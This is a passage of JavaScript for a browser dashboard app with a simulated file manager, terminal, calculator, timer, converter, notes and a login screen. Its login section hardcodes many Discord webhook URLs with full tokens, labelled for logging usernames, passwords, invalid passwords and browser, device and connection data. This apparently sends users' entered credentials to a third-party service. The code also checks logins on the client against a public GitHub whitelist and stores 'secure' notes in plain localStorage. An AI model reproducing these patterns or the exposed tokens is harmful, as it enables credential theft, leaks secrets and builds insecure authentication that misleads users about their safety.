                  if (itemData.type === 'folder') icon = '📁';
                  else if (itemData.type === 'image') icon = '📸';
                  else if (itemData.type === 'exe') icon = '⚙️'; // Example for executable
                  item.innerHTML = `<span class="file-item-icon">${icon}</span>${name}`;

                  item.addEventListener('click', () => {
                      if (itemData.type === 'folder') {
                          this.currentFileManagerPath = this.currentFileManagerPath + name + '/';
                          renderFileList();
                          logActivity(`Navigated to folder: ${this.currentFileManagerPath}.`, "info");
                      } else {
                          // Simulate opening a file (e.g., show content in an alert/modal)
                          if (itemData.content) {
                              showNotification(`Opened file: ${name}`, "info");
                              alert(`--- ${name} ---\n${itemData.content}`);
                              logActivity(`File opened: ${name}.`, "info");
                          } else if (itemData.type === 'image') {
                              showNotification(`Viewing image: ${name}`, "info");
                              alert(`(Simulated) Displaying image: ${name}`); // In a real app, this would be a modal with the image
                              logActivity(`Image file opened: ${name}.`, "info");
                          } else {
                              showNotification(`Cannot open file: ${name}`, "warning");
                              logActivity(`Attempted to open unknown file type: ${name}.`, "warning");
                          }
                      }
                  });
                  fmFileList.appendChild(item);
              });
          };

          fmGoUpBtn.addEventListener('click', () => {
              if (this.currentFileManagerPath !== '/home/user/') {
                  const pathParts = this.currentFileManagerPath.split('/').filter(p => p);
                  pathParts.pop();
                  this.currentFileManagerPath = '/' + pathParts.join('/') + (pathParts.length > 0 ? '/' : 'home/user/');
                  this.currentFileManagerPath = this.currentFileManagerPath.replace('//', '/');
                  if (this.currentFileManagerPath === '/') this.currentFileManagerPath = '/home/user/';
                  renderFileList();
                  logActivity(`Navigated up to: ${this.currentFileManagerPath}.`, "info");
              } else {
                  showNotification("Already at root directory.", "warning", 2000);
              }
          });

          fmNewFolderBtn.addEventListener('click', () => {
              const folderName = prompt("Enter new folder name:");
              if (folderName && folderName.trim()) {
                  const newFolderName = folderName.trim();
                  const currentDir = this.fileSystem[this.currentFileManagerPath];
                  if (currentDir[newFolderName]) {
                      showNotification("Folder already exists!", "error");
                      return;
                  }
                  currentDir[newFolderName] = { type: 'folder' };
                  this.fileSystem[this.currentFileManagerPath + newFolderName + '/'] = {}; // Create new empty directory
                  renderFileList();
                  showNotification(`Folder "${newFolderName}" created.`, "success");
                  logActivity(`New folder created: "${newFolderName}" in ${this.currentFileManagerPath}.`, "success");
              }
          });

          fmNewFileBtn.addEventListener('click', () => {
              const fileName = prompt("Enter new file name (e.g., mydocument.txt):");
              if (fileName && fileName.trim()) {
                  const newFileName = fileName.trim();
                  const currentDir = this.fileSystem[this.currentFileManagerPath];
                  if (currentDir[newFileName]) {
                      showNotification("File already exists!", "error");
                      return;
                  }
                  currentDir[newFileName] = { type: 'file', content: 'New file created. Add content here.' };
                  renderFileList();
                  showNotification(`File "${newFileName}" created.`, "success");
                  logActivity(`New file created: "${newFileName}" in ${this.currentFileManagerPath}.`, "success");
              }
          });

          fmUploadBtn.addEventListener('click', () => {
              showNotification("Simulating file upload... (Feature not fully implemented)", "info");
              logActivity("Attempted simulated file upload.", "info");
          });

          renderFileList(); // Initial render
          logActivity("File Manager initialized.", "info");
      },

      // Terminal Emulator (Simulated)
      initTerminal: function() {
          const terminalOutput = document.getElementById('terminalOutput');
          const terminalInput = document.getElementById('terminalInput');
          const terminalPrompt = document.querySelector('.terminal-prompt');

          const appendOutput = (text, type = 'info') => {
              const line = document.createElement('div');
              line.textContent = text;
              line.classList.add(type);
              terminalOutput.appendChild(line);
              terminalOutput.scrollTop = terminalOutput.scrollHeight; // Scroll to bottom
          };

          const executeCommand = (command) => {
              const parts = command.trim().split(' ');
              const cmd = parts[0].toLowerCase();
              const args = parts.slice(1);

              appendOutput(`${terminalPrompt.textContent}${command}`); // Echo command

              switch (cmd) {
                  case 'help':
                      appendOutput('Available commands:');
                      appendOutput('  help - show this message');
                      appendOutput('  echo [text] - display text');
                      appendOutput('  ls - list current directory contents');
                      appendOutput('  cd [directory] - change directory');
                      appendOutput('  clear - clear terminal output');
                      appendOutput('  whoami - display current user');
                      appendOutput('  date - display current date and time');
                      appendOutput('  ping [ip] - simulate network ping');
                      logActivity(`Terminal command 'help' executed.`, "info");
                      break;
                  case 'echo':
                      appendOutput(args.join(' '));
                      logActivity(`Terminal command 'echo' executed with: ${args.join(' ')}.`, "info");
                      break;
                  case 'ls':
                      const currentDir = this.fileSystem[this.terminalCurrentPath];
                      if (currentDir) {
                          const items = Object.keys(currentDir).map(name => {
                              const item = currentDir[name];
                              return item.type === 'folder' ? `📁 ${name}/` : `📄 ${name}`;
                          });
                          appendOutput(items.length > 0 ? items.join('\n') : '[Empty Directory]');
                          logActivity(`Terminal command 'ls' executed in ${this.terminalCurrentPath}.`, "info");
                      } else {
                          appendOutput(`Error: Directory not found: ${this.terminalCurrentPath}`, 'error');
                      }
                      break;
                  case 'cd':
                      const targetDir = args[0];
                      if (!targetDir) {
                          appendOutput(`Current directory: ${this.terminalCurrentPath}`);
                          break;
                      }
                      let newPath = '';
                      if (targetDir === '..') {
                          const pathParts = this.terminalCurrentPath.split('/').filter(p => p);
                          pathParts.pop();
                          newPath = '/' + pathParts.join('/') + (pathParts.length > 0 ? '/' : 'home/user/');
                          newPath = newPath.replace('//', '/');
                          if (newPath === '/') newPath = '/home/user/'; // Ensure base path
                      } else if (targetDir.startsWith('/')) { // Absolute path
                          newPath = targetDir.endsWith('/') ? targetDir : targetDir + '/';
                      } else { // Relative path
                          newPath = this.terminalCurrentPath + targetDir + '/';
                      }
                      newPath = newPath.replace(/\/\//g, '/'); // Clean up double slashes

                      if (newPath.endsWith('/')) newPath = newPath.slice(0, -1) + '/'; // Ensure trailing slash for dirs

                      if (this.fileSystem[newPath] || newPath === '/home/user/') { // Check if directory exists
                          this.terminalCurrentPath = newPath;
                          terminalPrompt.textContent = `user@system:${this.terminalCurrentPath.replace('/home/user', '~')} $`;
                          logActivity(`Terminal command 'cd' to ${this.terminalCurrentPath}.`, "info");
                      } else {
                          appendOutput(`Error: Directory not found: ${targetDir}`, 'error');
                          logActivity(`Terminal command 'cd' failed: Directory not found: ${targetDir}.`, "error");
                      }
                      break;
                  case 'clear':
                      terminalOutput.innerHTML = '';
                      appendOutput('Terminal cleared.');
                      logActivity(`Terminal cleared.`, "info");
                      break;
                  case 'whoami':
                      appendOutput(`User: ${document.getElementById('loggedInUser').textContent}`);
                      logActivity(`Terminal command 'whoami' executed.`, "info");
                      break;
                  case 'date':
                      appendOutput(new Date().toLocaleString());
                      logActivity(`Terminal command 'date' executed.`, "info");
                      break;
                  case 'ping':
                      const ip = args[0] || '127.0.0.1';
                      appendOutput(`Pinging ${ip} with 32 bytes of data:`);
                      setTimeout(() => appendOutput(`Reply from ${ip}: bytes=32 time=5ms TTL=64`), 500);
                      setTimeout(() => appendOutput(`Reply from ${ip}: bytes=32 time=4ms TTL=64`), 1000);
                      setTimeout(() => appendOutput(`Reply from ${ip}: bytes=32 time=6ms TTL=64`), 1500);
                      setTimeout(() => appendOutput(`Ping statistics for ${ip}:\n    Packets: Sent = 3, Received = 3, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 4ms, Maximum = 6ms, Average = 5ms`), 2000);
                      logActivity(`Terminal command 'ping ${ip}' executed.`, "info");
                      break;
                  default:
                      appendOutput(`Error: Command not found: ${cmd}`, 'error');
                      logActivity(`Terminal command failed: Command not found: ${cmd}.`, "error");
              }
          };

          terminalInput.addEventListener('keydown', (e) => {
              if (e.key === 'Enter') {
                  const command = terminalInput.value.trim();
                  if (command) {
                      this.terminalHistory.push(command);
                      this.terminalCommandIndex = this.terminalHistory.length;
                      executeCommand(command);
                      terminalInput.value = '';
                  }
              } else if (e.key === 'ArrowUp') {
                  e.preventDefault();
                  if (this.terminalCommandIndex > 0) {
                      this.terminalCommandIndex--;
                      terminalInput.value = this.terminalHistory[this.terminalCommandIndex];
                  }
              } else if (e.key === 'ArrowDown') {
                  e.preventDefault();
                  if (this.terminalCommandIndex < this.terminalHistory.length - 1) {
                      this.terminalCommandIndex++;
                      terminalInput.value = this.terminalHistory[this.terminalCommandIndex];
                  } else if (this.terminalCommandIndex === this.terminalHistory.length - 1) {
                      this.terminalCommandIndex++;
                      terminalInput.value = ''; // Go to empty input after last command
                  }
              }
          });
          logActivity("Terminal Emulator initialized.", "info");
      },

      // Weather Widget (Simulated)
      initWeatherWidget: function() {
          const weatherIcon = document.getElementById('weatherIcon');
          const weatherTemp = document.getElementById('weatherTemp');
          const weatherDescription = document.getElementById('weatherDescription');
          const weatherLocation = document.getElementById('weatherLocation');
          const refreshWeatherBtn = document.getElementById('refreshWeatherBtn');

          const weatherConditions = [
              { icon: '☀️', tempRange: [20, 30], desc: 'Clear Sky' },
              { icon: '☁️', tempRange: [15, 25], desc: 'Partly Cloudy' },
              { icon: '🌧️', tempRange: [10, 20], desc: 'Rainy' },
              { icon: '⛈️', tempRange: [18, 28], desc: 'Thunderstorms' },
              { icon: '🌫️', tempRange: [5, 15], desc: 'Foggy' },
              { icon: '❄️', tempRange: [-5, 5], desc: 'Snowy' }
          ];

          const updateWeather = () => {
              const randomCondition = weatherConditions[Math.floor(Math.random() * weatherConditions.length)];
              const temp = (Math.random() * (randomCondition.tempRange[1] - randomCondition.tempRange[0]) + randomCondition.tempRange[0]).toFixed(1);

              weatherIcon.textContent = randomCondition.icon;
              weatherTemp.textContent = `${temp}°C`;
              weatherDescription.textContent = randomCondition.desc;
              weatherLocation.textContent = "Middletown, PA (Simulated)";
              showNotification("Weather updated.", "info", 2000);
              logActivity(`Simulated weather updated: ${randomCondition.desc}, ${temp}°C.`, "info");
          };
          
          refreshWeatherBtn.addEventListener('click', updateWeather);
          updateWeather(); // Initial weather display
          logActivity("Weather Widget initialized.", "info");
      },

      // Calculator
      initCalculator: function() {
          const display = document.getElementById('calcDisplay');
          const buttons = document.querySelector('.calculator-grid');

          const updateDisplay = () => {
              display.textContent = this.calcDisplayValue;
          };

          const inputDigit = (digit) => {
              if (this.calcWaitingForSecondOperand === true) {
                  this.calcDisplayValue = digit;
                  this.calcWaitingForSecondOperand = false;
              } else {
                  this.calcDisplayValue = this.calcDisplayValue === '0' ? digit : this.calcDisplayValue + digit;
              }
              updateDisplay();
          };

          const inputDecimal = (dot) => {
              if (this.calcWaitingForSecondOperand === true) {
                  this.calcDisplayValue = '0.';
                  this.calcWaitingForSecondOperand = false;
                  updateDisplay();
                  return;
              }
              if (!this.calcDisplayValue.includes(dot)) {
                  this.calcDisplayValue += dot;
              }
              updateDisplay();
          };

          const handleOperator = (nextOperator) => {
              const inputValue = parseFloat(this.calcDisplayValue);

              if (this.calcOperator && this.calcWaitingForSecondOperand) {
                  this.calcOperator = nextOperator;
                  return;
              }

              if (this.calcFirstOperand === null) {
                  this.calcFirstOperand = inputValue;
              } else if (this.calcOperator) {
                  const result = this.performCalculation[this.calcOperator](this.calcFirstOperand, inputValue);
                  this.calcDisplayValue = String(parseFloat(result.toFixed(7))); // Limit decimal places and convert to string
                  this.calcFirstOperand = result;
              }

              this.calcWaitingForSecondOperand = true;
              this.calcOperator = nextOperator;
              updateDisplay();
          };

          const resetCalculator = () => {
              this.calcDisplayValue = '0';
              this.calcFirstOperand = null;
              this.calcWaitingForSecondOperand = false;
              this.calcOperator = null;
              updateDisplay();
              logActivity("Calculator reset.", "info");
          };

          this.performCalculation = {
              '/': (firstOperand, secondOperand) => firstOperand / secondOperand,
              '*': (firstOperand, secondOperand) => firstOperand * secondOperand,
              '+': (firstOperand, secondOperand) => firstOperand + secondOperand,
              '-': (firstOperand, secondOperand) => firstOperand - secondOperand,
              '=': (firstOperand, secondOperand) => secondOperand,
              '%': (firstOperand, secondOperand) => (firstOperand / 100) * secondOperand, // Simple percentage
              '+/-': (firstOperand, secondOperand) => -secondOperand // Unary operator handled separately
          };

          buttons.addEventListener('click', (event) => {
              const { target } = event;
              const { value, action } = target.dataset;

              if (!target.matches('button')) {
                  return;
              }

              if (action === 'clear') {
                  resetCalculator();
                  return;
              }

              if (target.classList.contains('operator')) {
                  if (value === '+/-') {
                      this.calcDisplayValue = String(parseFloat(this.calcDisplayValue) * -1);
                      updateDisplay();
                      return;
                  }
                  handleOperator(value);
                  return;
              }

              if (value === '.') {
                  inputDecimal(value);
                  return;
              }

              inputDigit(value);
          });
          updateDisplay();
          logActivity("Calculator initialized.", "info");
      },

      // Stopwatch & Timer
      initStopwatchTimer: function() {
          const stopwatchDisplay = document.getElementById('stopwatchDisplay');
          const stopwatchStartBtn = document.getElementById('stopwatchStartBtn');
          const stopwatchStopBtn = document.getElementById('stopwatchStopBtn');
          const stopwatchResetBtn = document.getElementById('stopwatchResetBtn');

          const timerDisplay = document.getElementById('timerDisplay');
          const timerInput = document.getElementById('timerInput');
          const timerStartBtn = document.getElementById('timerStartBtn');
          const timerPauseBtn = document.getElementById('timerPauseBtn');
          const timerResetBtn = document.getElementById('timerResetBtn');

          // Stopwatch functions
          const updateStopwatch = () => {
              const currentTime = Date.now();
              this.stopwatchElapsedTime = currentTime - this.stopwatchStartTime;
              stopwatchDisplay.textContent = this.formatTime(Math.floor(this.stopwatchElapsedTime / 1000));
          };

          stopwatchStartBtn.addEventListener('click', () => {
              if (!this.stopwatchRunning) {
                  this.stopwatchStartTime = Date.now() - this.stopwatchElapsedTime;
                  this.stopwatchIntervalId = setInterval(updateStopwatch, 1000);
                  this.stopwatchRunning = true;
                  logActivity("Stopwatch started.", "info");
              }
          });

          stopwatchStopBtn.addEventListener('click', () => {
              if (this.stopwatchRunning) {
                  clearInterval(this.stopwatchIntervalId);
                  this.stopwatchRunning = false;
                  logActivity("Stopwatch stopped.", "info");
              }
          });

          stopwatchResetBtn.addEventListener('click', () => {
              clearInterval(this.stopwatchIntervalId);
              this.stopwatchRunning = false;
              this.stopwatchElapsedTime = 0;
              stopwatchDisplay.textContent = '00:00:00';
              logActivity("Stopwatch reset.", "info");
          });

          // Timer functions
          const updateTimerDisplay = () => {
              timerDisplay.textContent = this.formatTime(this.timerRemainingTime);
          };

          const timerCountdown = () => {
              if (this.timerRemainingTime <= 0) {
                  clearInterval(this.timerIntervalId);
                  this.timerRunning = false;
                  updateTimerDisplay();
                  showNotification("Timer finished!", "success", 5000);
                  logActivity("Countdown timer finished.", "success");
                  // Optional: play a sound or visual alert
                  return;
              }
              this.timerRemainingTime--;
              updateTimerDisplay();
          };

          timerStartBtn.addEventListener('click', () => {
              if (!this.timerRunning) {
                  if (this.timerRemainingTime <= 0) {
                      const minutes = parseInt(timerInput.value, 10);
                      if (isNaN(minutes) || minutes <= 0) {
                          showNotification("Please enter a valid number of minutes for the timer.", "warning");
                          return;
                      }
                      this.timerOriginalDuration = minutes * 60; // Store initial duration
                      this.timerRemainingTime = this.timerOriginalDuration;
                  }
                  
                  this.timerIntervalId = setInterval(timerCountdown, 1000);
                  this.timerRunning = true;
                  updateTimerDisplay();
                  logActivity(`Countdown timer started for ${this.timerOriginalDuration / 60} minutes.`, "info");
              }
          });

          timerPauseBtn.addEventListener('click', () => {
              if (this.timerRunning) {
                  clearInterval(this.timerIntervalId);
                  this.timerRunning = false;
                  logActivity("Countdown timer paused.", "info");
              }
          });

          timerResetBtn.addEventListener('click', () => {
              clearInterval(this.timerIntervalId);
              this.timerRunning = false;
              this.timerRemainingTime = this.timerOriginalDuration || 0; // Reset to original or 0
              updateTimerDisplay();
              logActivity("Countdown timer reset.", "info");
          });

          timerInput.addEventListener('change', () => {
              const minutes = parseInt(timerInput.value, 10);
              if (!isNaN(minutes) && minutes > 0) {
                  this.timerOriginalDuration = minutes * 60;
                  this.timerRemainingTime = this.timerOriginalDuration;
                  updateTimerDisplay();
              }
          });

          updateStopwatch(); // Initial stopwatch display
          updateTimerDisplay(); // Initial timer display
          logActivity("Stopwatch and Timer initialized.", "info");
      },

      // Unit Converter
      initUnitConverter: function() {
          const convertValueInput = document.getElementById('convertValue');
          const convertFromUnitSelect = document.getElementById('convertFromUnit');
          const convertToUnitSelect = document.getElementById('convertToUnit');
          const convertedValueDisplay = document.getElementById('convertedValue');
          const convertBtn = document.getElementById('convertBtn');

          const conversionFactors = {
              meters: {
                  feet: 3.28084,
              },
              feet: {
                  meters: 0.3048,
              },
              kilograms: {
                  pounds: 2.20462,
              },
              pounds: {
                  kilograms: 0.453592,
              },
              celsius: {
                  fahrenheit: (c) => (c * 9/5) + 32,
              },
              fahrenheit: {
                  celsius: (f) => (f - 32) * 5/9,
              },
          };

          const performConversion = () => {
              const value = parseFloat(convertValueInput.value);
              const fromUnit = convertFromUnitSelect.value;
              const toUnit = convertToUnitSelect.value;

              if (isNaN(value)) {
                  convertedValueDisplay.textContent = 'Invalid Value';
                  return;
              }

              if (fromUnit === toUnit) {
                  convertedValueDisplay.textContent = value;
                  return;
              }

              let result;
              if (fromUnit in conversionFactors && toUnit in conversionFactors[fromUnit]) {
                  const factor = conversionFactors[fromUnit][toUnit];
                  if (typeof factor === 'function') {
                      result = factor(value);
                  } else {
                      result = value * factor;
                  }
              } else if (toUnit in conversionFactors && fromUnit in conversionFactors[toUnit]) {
                  // Handle inverse conversion if direct isn't available (e.g., Celsius to Fahrenheit inverse)
                  const factor = conversionFactors[toUnit][fromUnit];
                  if (typeof factor === 'function') {
                      // Need to reverse the function: e.g., if F = (C * 9/5) + 32, then C = (F - 32) * 5/9
                      // This is why temperature conversions are special-cased.
                      convertedValueDisplay.textContent = 'Units incompatible for direct inverse via this path.';
                      return;
                  } else {
                      result = value / factor;
                  }
              } else {
                  convertedValueDisplay.textContent = 'Incompatible Units';
                  showNotification(`Incompatible units for conversion: ${fromUnit} to ${toUnit}.`, "error");
                  logActivity(`Unit conversion failed: Incompatible units ${fromUnit} to ${toUnit}.`, "error");
                  return;
              }

              convertedValueDisplay.textContent = result.toFixed(3); // Display with 3 decimal places
              showNotification(`Converted ${value} ${fromUnit} to ${result.toFixed(3)} ${toUnit}.`, "success", 2000);
              logActivity(`Converted ${value} ${fromUnit} to ${result.toFixed(3)} ${toUnit}.`, "success");
          };

          convertBtn.addEventListener('click', performConversion);
          // Also perform conversion if inputs change
          convertValueInput.addEventListener('input', performConversion);
          convertFromUnitSelect.addEventListener('change', performConversion);
          convertToUnitSelect.addEventListener('change', performConversion);
          
          // Initial conversion
          performConversion();
          logActivity("Unit Converter initialized.", "info");
      },

      // Secure Notes (Text-based)
      initSecureNotes: function() {
          const notesTextarea = document.getElementById('secureNotesText');
          const saveBtn = document.getElementById('saveSecureNotesBtn');
          const clearBtn = document.getElementById('clearSecureNotesBtn');

          // Load notes
          const savedNotes = localStorage.getItem('dashboardSecureNotes');
          if (savedNotes) {
              notesTextarea.value = savedNotes;
          }

          saveBtn.addEventListener('click', () => {
              localStorage.setItem('dashboardSecureNotes', notesTextarea.value);
              showNotification("Notes saved securely!", "success");
              logActivity("Secure notes saved.", "success");
          });

          clearBtn.addEventListener('click', () => {
              if (confirm("Are you sure you want to clear all your secure notes? This action cannot be undone.")) {
                  notesTextarea.value = '';
                  localStorage.removeItem('dashboardSecureNotes');
                  showNotification("Notes cleared.", "info");
                  logActivity("Secure notes cleared.", "info");
              }
          });
          logActivity("Secure Notes initialized.", "info");
      },

      // News Feed (Simulated)
      initNewsFeed: function() {
          const newsFeedContent = document.getElementById('newsFeedContent');
          const refreshNewsFeedBtn = document.getElementById('refreshNewsFeedBtn');

          const renderNewsFeed = () => {
              newsFeedContent.innerHTML = '';
              const shuffledNews = [...this.simulatedNewsHeadlines].sort(() => 0.5 - Math.random()); // Shuffle array
              const displayCount = Math.min(shuffledNews.length, 3); // Display top 3 for brevity

              for (let i = 0; i < displayCount; i++) {
                  const news = shuffledNews[i];
                  const newsItem = document.createElement('div');
                  newsItem.classList.add('news-item');
                  newsItem.innerHTML = `
                      <h3>${news.title}</h3>
                      <p>${news.content}</p>
                      <a href="${news.link}" target="_blank">Read More</a>
                  `;
                  newsFeedContent.appendChild(newsItem);
              }
              showNotification("News feed refreshed with new headlines.", "info", 2000);
              logActivity("Simulated news feed refreshed.", "info");
          };

          refreshNewsFeedBtn.addEventListener('click', renderNewsFeed);
          renderNewsFeed(); // Initial render
          logActivity("News Feed initialized.", "info");
      },

      // Activity Log (already used, just ensure it's logged)
      initActivityLog: function() {
          // Log messages are added via the `logActivity` helper function
          logActivity("Activity Log panel ready for events.", "info");
      },

      // User Profile & Settings
      initUserProfile: function() {
          const profileUsername = document.getElementById('profileUsername');
          const profileUserID = document.getElementById('profileUserID');
          const profileRole = document.getElementById('profileRole');
          const profileLastLogin = document.getElementById('profileLastLogin');
          const profileCustomStatus = document.getElementById('profileCustomStatus');
          const profileThemeSelect = document.getElementById('profileThemeSelect');
          const saveProfileSettingsBtn = document.getElementById('saveProfileSettingsBtn');
          const resetProfileSettingsBtn = document.getElementById('resetProfileSettingsBtn');

          // Populate with current logged in user details
          profileUsername.textContent = document.getElementById('loggedInUser').textContent;
          profileUserID.textContent = document.getElementById('loggedInID').textContent;
          profileRole.textContent = this.getProfileSetting('role', 'User'); // Assume default role if not in user JSON

          // Simulate last login time
          profileLastLogin.textContent = localStorage.getItem('lastLoginTime') || new Date().toLocaleString();

          // Load custom status and theme from localStorage
          profileCustomStatus.value = this.getProfileSetting('customStatus', '');
          profileThemeSelect.value = this.getProfileSetting('theme', 'dark-theme');

          saveProfileSettingsBtn.addEventListener('click', () => {
              this.saveProfileSetting('customStatus', profileCustomStatus.value);
              this.saveProfileSetting('theme', profileThemeSelect.value);
              
              // Apply theme change immediately
              document.body.classList.remove('dark-theme', 'light-theme', 'matrix-theme', 'cyber-theme');
              document.body.classList.add(profileThemeSelect.value);
              this.updateThemeButtonText(profileThemeSelect.value); // Update quick panel button text too

              showNotification("Profile settings saved!", "success");
              logActivity("User profile settings saved.", "success");
          });

          resetProfileSettingsBtn.addEventListener('click', () => {
              if (confirm("Are you sure you want to reset your profile settings to default?")) {
                  localStorage.removeItem('dashboardProfileSettings');
                  // Re-load to apply defaults
                  this.loadProfileSettings();
                  this.initUserProfile(); // Re-initialize to update fields
                  showNotification("Profile settings reset to default.", "info");
                  logActivity("User profile settings reset to default.", "info");
              }
          });
          
          profileThemeSelect.addEventListener('change', () => {
            const selectedTheme = profileThemeSelect.value;
            document.body.classList.remove('dark-theme', 'light-theme', 'matrix-theme', 'cyber-theme');
            document.body.classList.add(selectedTheme);
            this.updateThemeButtonText(selectedTheme);
            logActivity(`Theme temporarily changed via profile settings to: ${selectedTheme}.`, "info");
          });
          
          logActivity("User Profile & Settings initialized.", "info");
      },

      // Helper for Profile Settings
      saveProfileSetting: function(key, value) {
          let settings = JSON.parse(localStorage.getItem('dashboardProfileSettings') || '{}');
          settings[key] = value;
          localStorage.setItem('dashboardProfileSettings', JSON.stringify(settings));
      },

      getProfileSetting: function(key, defaultValue) {
          let settings = JSON.parse(localStorage.getItem('dashboardProfileSettings') || '{}');
          return settings[key] !== undefined ? settings[key] : defaultValue;
      },

      loadProfileSettings: function() {
          const theme = this.getProfileSetting('theme', 'dark-theme'); // Default to dark-theme
          document.body.classList.add(theme);
      },

      // Particle.js Background
      initParticles: function() {
          // Check if particles.js is loaded
          if (typeof particlesJS !== 'undefined') {
              particlesJS('particles-js', {
                  "particles": {
                      "number": {
                          "value": 40, // Reduced number for subtlety
                          "density": {
                              "enable": true,
                              "value_area": 800
                          }
                      },
                      "color": {
                          "value": "#cccccc" // Neutral color, will blend with theme
                      },
                      "shape": {
                          "type": "circle",
                          "stroke": {
                              "width": 0,
                              "color": "#000000"
                          },
                          "polygon": {
                              "nb_sides": 5
                          }
                      },
                      "opacity": {
                          "value": 0.5,
                          "random": false,
                          "anim": {
                              "enable": false,
                              "speed": 1,
                              "opacity_min": 0.1,
                              "sync": false
                          }
                      },
                      "size": {
                          "value": 3,
                          "random": true,
                          "anim": {
                              "enable": false,
                              "speed": 40,
                              "size_min": 0.1,
                              "sync": false
                          }
                      },
                      "line_linked": {
                          "enable": true,
                          "distance": 150,
                          "color": "#cccccc",
                          "opacity": 0.4,
                          "width": 1
                      },
                      "move": {
                          "enable": true,
                          "speed": 2, // Slower movement
                          "direction": "none",
                          "random": false,
                          "straight": false,
                          "out_mode": "out",
                          "bounce": false,
                          "attract": {
                              "enable": false,
                              "rotateX": 600,
                              "rotateY": 1200
                          }
                      }
                  },
                  "interactivity": {
                      "detect_on": "canvas",
                      "events": {
                          "onhover": {
                              "enable": true,
                              "mode": "grab" // Subtle grab effect
                          },
                          "onclick": {
                              "enable": true,
                              "mode": "push" // Push particles on click
                          },
                          "resize": true
                      },
                      "modes": {
                          "grab": {
                              "distance": 140,
                              "line_linked": {
                                  "opacity": 1
                              }
                          },
                          "bubble": {
                              "distance": 400,
                              "size": 40,
                              "duration": 2,
                              "opacity": 8,
                              "speed": 3
                          },
                          "repulse": {
                              "distance": 200,
                              "duration": 0.4
                          },
                          "push": {
                              "particles_nb": 4
                          },
                          "remove": {
                              "particles_nb": 2
                          }
                      }
                  },
                  "retina_detect": true
              });
              logActivity("Particle background initialized.", "info");
          } else {
              console.warn("particles.js library not loaded. Particle background will not be active.");
              logActivity("Particle background failed to load (particles.js missing).", "warning");
          }
      },

      // --- Global Event Listeners ---
      setupEventListeners: function() {
        // Handle window resize for canvas responsiveness (basic resize logic)
        window.addEventListener('resize', () => {
            const canvas = document.getElementById('notesCanvas');
            const container = canvas.parentElement;
            // Adjust canvas width to fit container, keep aspect ratio or fixed height
            // For simplicity, we'll keep it within its max-width CSS for now.
            // For true responsiveness, canvas width/height attributes might need to be set programmatically.
        });
      }
    };

    // --- Login System JavaScript ---
    (() => {
      // Show loading overlay immediately
      const loadingOverlay = document.getElementById('loadingOverlay');
      loadingOverlay.classList.remove('hidden');

      const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/main/Whitelist.json'; // Ensure this URL is correct and accessible

      // Webhooks for the new logging systems
      const loggingWebhooks = {
        username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
        password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
        identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsRPHQjf1Oj7Ce9c02cA',
        invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
        invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
        invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
        attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
        attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ'
      };

      // Original webhooks
      const webhookUrls = {
        userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
        browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
        deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
        connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
        sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
      };
      
      const loginBox = document.getElementById('loginBox');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const userIDInput = document.getElementById('userID');
      const showPasswordCheckbox = document.getElementById('showPassword');
      const submitBtn = document.getElementById('submitBtn');
      const errorMsg = document.getElementById('errorMsg');
      const attemptsText = document.getElementById('attemptsText');
      const resetPopup = document.getElementById('resetPopup');
      const resetField = document.getElementById('resetField');
      const resetBtn = document.getElementById('resetBtn');

      let attempts = 5;
      let users = [];
      let loginTime = null;

      // Show/hide password toggle
      showPasswordCheckbox.addEventListener('change', () => {
        passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
      });

      // Fetch user JSON data on load
      fetch(USER_JSON_URL)
        .then(res => res.json())
        .then(data => {
          users = data;
        })
        .catch((err) => {
          users = [];
          console.error('Failed to load user JSON data:', err);
          showNotification('Failed to load user data. Login might be unavailable.', 'error');
        })
        .finally(() => {
          // Hide loading overlay after users are loaded (or failed to load)
          setTimeout(() => {
              loadingOverlay.classList.add('hidden');
          }, 1000); // Give a small delay for the animation
        });

      // Flash red outline function
      function flashRedOutline(times = 2, delay = 400) {
        let count = 0;
        function flash() {
          loginBox.classList.add('flashing');
          setTimeout(() => {
            loginBox.classList.remove('flashing');
            count++;
            if (count < times) setTimeout(flash, delay);
          }, delay);
        }
        flash();
      }

